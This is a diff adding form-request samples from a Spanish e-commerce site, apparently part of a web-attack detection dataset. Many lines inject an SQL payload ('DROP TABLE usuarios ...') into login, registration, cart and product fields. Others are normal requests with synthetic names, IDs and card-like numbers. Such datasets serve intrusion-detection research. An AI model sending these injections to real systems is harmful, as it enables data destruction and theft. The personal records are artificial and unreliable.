@@ -1,0 +1,102 @@
+id=2 nombre=Jamn+Ibrico precio=85 cantidad=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=entrar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ login=jeanes pwd=d712 remember=on 
+modo=registro login=pye password=59rola9o nombre=Hermenegilda apellidos=Lunar+De+Broy email=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ dni=39171878A direccion=Plaa+Rectoria+17+8A ciudad=Aljar cp=27118 provincia=Salamanca ntc=5074100981550289 
+B2=Vaciar+carrito+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=sawyers password=encUmb2ad3+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ nombre=Max apellidos=Sjstrand+Ampurias email=tamburihispadis.ar dni=30293636Z direccion=C+Virgen+De+Las+Angustias+122+4A ciudad=Fuentespina cp=48220 provincia=Asturias ntc=8898020239162472 
+B2=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=linni password=892444a9aci8 nombre=Rosario apellidos=Bagudanc+Robles email=haumannmaxiwagen.tj dni=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ direccion=C+Santa+Beatriz+104+8D ciudad=Mingorra cp=42173 provincia=Palencia ntc=8723970834822268 
+modo=registro login=dido password=enmarch3tar nombre=Bertilda apellidos=Deverdun email=low.felicianoazkara.sj dni=19110618X direccion=Prolongacion+Algeciras+169+ ciudad=Navarredonda+de+Gredos cp=18418 provincia=Navarra ntc=1628195660765454 
+B2=Vaciar+carrito+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+B2=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=2 nombre=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=100 cantidad=97 
+B2=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=price password=enlucimiento nombre=Roldan apellidos=Kisines+Selvas email=sverdlincortinasartesol.gl dni=57845890Q direccion=Muelle+Caonero+Dato+SN+6-G ciudad=Luisiana+La+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ cp=10811 provincia=Palencia ntc=1813562312950494 
+id=2 nombre=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=85 cantidad=18 
+modo=registro login=bennet password=96c5sa nombre=Sid apellidos=Echegoyen+Pazarn email=senghor-golling324htranslations.ht dni=16864786J direccion=Barriada+De+La+Doctora+15+ ciudad=Roa cp=03610+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ provincia=Valladolid ntc=0695001148270797 
+id=1+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=entrar login=alvarez pwd=9ec828+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ remember=on 
+modo=insertar precio=8588 
+modo=registro login=schoen password=cartear nombre=Zaima apellidos=Falgeras+Puerta email=hargitaycorjet.coop dni=33685330J direccion=Calle+Pedro+Salinas+15+6H+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ ciudad=Bierge cp=44155 provincia=Cceres ntc=2909791700288840 
+modo=registro login=essam password=Cat*ERtiCA nombre=Dacil apellidos=Matamala email=sabin.prestersandrasummer.jm+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ dni=65185439N direccion=C+Marin+De+Rodezno+178+ ciudad=Gumiel+de+Mercado cp=48140 provincia=Badajoz ntc=9377201272032369 
+modo=registro login=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ password=segundar nombre=Armelio apellidos=Gochez email=shankleydiscon.sz dni=25054750E direccion=C+Fuente+Del+Rey+SN+ ciudad=Gavilanes cp=36110 provincia=Salamanca ntc=2607422784974121 
+id=1+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ nombre=Jamn+Ibrico precio=100 cantidad=97 
+errorMsg=Credenciales+incorrectas+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=pascali password=o73-r1111 nombre=Helidora apellidos=Estrems email=cederlund-solaulahost.qa dni=90572791X direccion=Calle+Urquizu+190+11F ciudad=Santa+Magdalena+de+Pulpis cp=05697 provincia=Zaragoza+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ ntc=3975543619812448 
+modo=insertar precio=7744 
+B2=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=poyi password=yaro nombre=Gismundo apellidos=Ventall+Tesisteco email=tamburroaprendeaestudiar.sj dni=24987514S direccion=Travesia+Diego+De+Almagro+194+ ciudad=Pepino cp=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ provincia=A+Corua ntc=0040408141488994 
+modo=registro login=etoh password=3Nt783E68r nombre=Tatiano apellidos=Renilla+Currius email=sovagovicengomera.com.vc dni=57024590T direccion=Vera+De+Bidasoa+115+6C ciudad=Lizoin cp=10520 provincia=Zamora ntc=0723351625880614 
+B2=Vaciar+carrito+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=jozef password=ve9dErse nombre=Tahiel apellidos=Ortiz+Narvarte email=lemontierviajesnacionales.kp dni=70721027Y direccion=Calle+Virgen+De+La+Hoz+123+4-B ciudad=Borrass+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ cp=44564 provincia=Zaragoza ntc=7002955624204925 
+modo=entrar login=mcnair pwd=81cob6r remember=off 
+modo=registro login=donnelly password=14a8u19lero nombre=Alessandra apellidos=Ricom+Morato email=gamboldfok.so dni=66367222D+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ direccion=Calle+Cavallers+63+ ciudad=Tocina cp=03729 provincia=Valladolid ntc=2169388539628734 
+errorMsg=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=insertar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=6072 
+modo=registro login=swick password=recalzar nombre=Amiel apellidos=Del+Blanco email=ying-carridineaudiosat.sy dni=55739537A direccion=Jose+Cadierno+186+6F ciudad=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ cp=37621 provincia=Asturias ntc=2320151892972616 
+modo=entrar login=zaretsky pwd=725l479zo remember=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=entrar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ login=hua-yuan pwd=*anoria remember=off 
+modo=registro login=brittan password=al9mb532 nombre=Onila apellidos=Furcat+Zarco email=greiffopticaweb.bu dni=36455660Q direccion=Calle+Nueve+57++DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ ciudad=Utiel cp=01899 provincia=Madrid ntc=0088492463086794 
+id=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ nombre=Jamn+Ibrico precio=85 cantidad=21 
+id=2+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=1+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=1 nombre=Queso+Manchego+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=39 cantidad=15 
+modo=insertar precio=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=entrar login=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ pwd=ensaada remember=on 
+modo=registro login=gilly password=femenciar nombre=Octaviano+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ apellidos=Heredia+Wald email=meskill_ferlinghettiwormee.pw dni=37936735Y direccion=C+Ginebre+98+ ciudad=Manzanillo cp=33310 provincia=Segovia ntc=1741584206084308 
+modo=insertar precio=8588 
+modo=registro login=horak password=6eSi74osO nombre=Blas apellidos=Gasca+Noria email=deardenhipermadrid.ga dni=01101234V direccion=Avenida+Comunidad+De+Madrid+45+13C ciudad=Villarreal+de+Huerva+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ cp=01170 provincia=Girona ntc=1336518549569700 
+modo=registro login=boinnard password=alARgUEZ nombre=Celinda apellidos=Alberti+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ email=moriconix2.com.pro dni=75775962R direccion=Doa+Sancha+16+ ciudad=Montesclaros cp=46230 provincia=Alicante ntc=7573620242761583 
+modo=entrar login=sydney pwd=raToNESCA remember=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=3+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ nombre=Vino+Rioja precio=100 cantidad=2 
+modo=registro login=bnrecad password=iNsolUBLe nombre=Aurelio apellidos=Ospina+Soma email=humbert24htranslations.name dni=78151636M direccion=Ramat+145+5B ciudad=Barbastro cp=31227 provincia=Valladolid ntc=5175468282615613 
+modo=registro login=nettle password=Heir nombre=Rad+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ apellidos=Zalarich+Llufriu email=duarteingenieriadelaconstruccion.vc dni=47182191Z direccion=Baza+55+ ciudad=Blecua+y+Torres cp=43151 provincia=Granada ntc=8375962445368254 
+modo=entrar login=hedrich pwd=chonta remember=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=insertar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=6606 
+id=3 nombre=Jamn+Ibrico precio=100 cantidad=74 
+modo=entrar login=ohio pwd=acerrador+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ remember=off 
+modo=registro login=arco password=saxosa nombre=Csar apellidos=Nossa+Vizcarrondo email=kunzer.giorgellicochesautomaticos.kn dni=64841759K direccion=Calle+Higueras+37+ ciudad=Unin+de+Campos+La cp=20130 provincia=Segovia ntc=1690304707007095 
+modo=registro login=raglin password=m783a1er3 nombre=Careli apellidos=Navines email=leclerc6soycastellano.gl dni=52316705P+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ direccion=C+Tavernes+Blanques+SN+ ciudad=Rupi cp=21610 provincia=Guipzcoa ntc=8201185179055303 
+modo=entrar login=catlin pwd=v76c088rA remember=off+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=santitor password=EnSimiSmaMIenTO nombre=Lionel apellidos=Ilizaliturri+Corominas email=cubelikdeltamarina.th dni=71111353E direccion=Rioja+153+ ciudad=Peamellera+Baja cp=19184+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ provincia=Zamora ntc=0802143307607123 
+id=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=insertar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=7191 
+id=2 nombre=Queso+Manchego precio=39 cantidad=76 
+id=2 nombre=Jamn+Ibrico precio=39+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ cantidad=90 
+modo=insertar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=3714 
+modo=registro login=vinet+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ password=RElatOrA nombre=Ihor apellidos=Bedos email=sangareaufaders.com.mil dni=74830064R direccion=Santa+Agueda+SN+5G ciudad=Zarza+de+Montnchez cp=28191 provincia=Jan ntc=9112082229252110 
+id=2 nombre=Jamn+Ibrico+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=100 cantidad=43 
+id=2 nombre=Jamn+Ibrico precio=100 cantidad=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+B2=Vaciar+carrito+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+errorMsg=Credenciales+incorrectas+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=insertar precio=3650+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+errorMsg=Credenciales+incorrectas+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+B2=Vaciar+carrito+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=micgael5 password=dogal nombre=Adelmo apellidos=Jepus+Novas email=cagneyhiperespaa.et+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ dni=99942317A direccion=Carrer+Sant+Fruitos+1+ ciudad=Riells+i+Viabrea cp=29410 provincia=Mlaga ntc=4452881808901719 
+modo=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=5080 
+modo=registro login=seagrove password=pataleo nombre=Grey apellidos=Bollit+Ingls email=weigellamasguapa.cc dni=15744863Y direccion=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ ciudad=Torno+El cp=18129 provincia=Cceres ntc=2139911097438297 
+modo=registro login=youngman password=a018699t0do nombre=Ibar apellidos=Bald+Almansa email=damboiseautomovilesalhambra.co dni=44906096E direccion=Calle+Lima+50+9-D ciudad=Catadau cp=42066 provincia=Madrid ntc=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+errorMsg=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=horatius password=323ant5CIdi3 nombre=Herenia apellidos=Witron+Olivares email=thrush_orhonsay6aadsl.no+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ dni=77733072H direccion=Calle+Reina+Regente+47+ ciudad=Sotillo+del+Rincn cp=09460 provincia=La+Rioja ntc=7365954967805937 
+errorMsg=Credenciales+incorrectas+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=1 nombre=Jamn+Ibrico precio=100 cantidad=93 
+modo=entrar login=schlacht pwd=43s8a remember=off 
+modo=registro login=swidersk password=balarrasa nombre=Yaco apellidos=Moriana+Romanov email=sintesnoticiasenvivo.mz dni=58500108E direccion=C+Parque+Iguazu+99+ ciudad=Agimes cp=48940 provincia=Valencia ntc=3622353817159390 
+modo=entrar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ login=chaar pwd=pe4ibl171o remember=on 
+modo=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ login=chaar pwd=pe4ibl171o remember=on 
+modo=insertar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=7701 
+B2=Vaciar+carrito+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+id=2 nombre=Jamn+Ibrico precio=100 cantidad=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=entrar login=rizzardi pwd=332G3le8a remember=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=registro login=xi-xian9+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ password=perspicacidad nombre=Geraldo apellidos=Pedrol email=chaloningenelec.gl dni=10207822P direccion=C+Paloma+197+ ciudad=Laguna+Dalga cp=47520 provincia=Pontevedra ntc=3590940446144864 
+modo=registro login=daesik2 password=2458ca1e581 nombre=Panciano apellidos=Bonitto+Ciraco email=dorsay.thursbyelrincondelmarmol.pr dni=51834543H+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ direccion=Cabo+De+Agua+SN+ ciudad=Villafranca+de+los+Barros cp=21240 provincia=Jan ntc=8319637256237029 
+modo=registro login=roanne password=dado nombre=Amadis apellidos=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ email=bronchudchuecafamily.org dni=86251880V direccion=Calle+Bucarelli+29+ ciudad=Huneja cp=02270 provincia=Cuenca ntc=2669670300165135 
+modo=registro login=detlef6+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ password=garrn nombre=Vigilio apellidos=Alcantara+Campanin email=padamseecomodindelhogar.no dni=71599604Y direccion=C+San+Xoan+115+ ciudad=Ciguuela cp=25737 provincia=Palencia ntc=7263738765493624 
+modo=registro login=suthers password=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ nombre=Rene apellidos=Aldeta+Marnetti email=pattersonarrsys.ke dni=88453156D direccion=Camino+De+Los+Robles+8+ ciudad=Caparroso cp=43694 provincia=Castelln ntc=4200323097821168 
+modo=entrar login=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ pwd=caLabrotar remember=on 
+B2=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=insertar+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ precio=3532 
+errorMsg=+DROP+TABLE+usuarios+SELECT+*+FROM+datos+WHERE+nombre+LIKE+ 
+modo=insertar precio=1063 
+modo=insertar precio=4344 
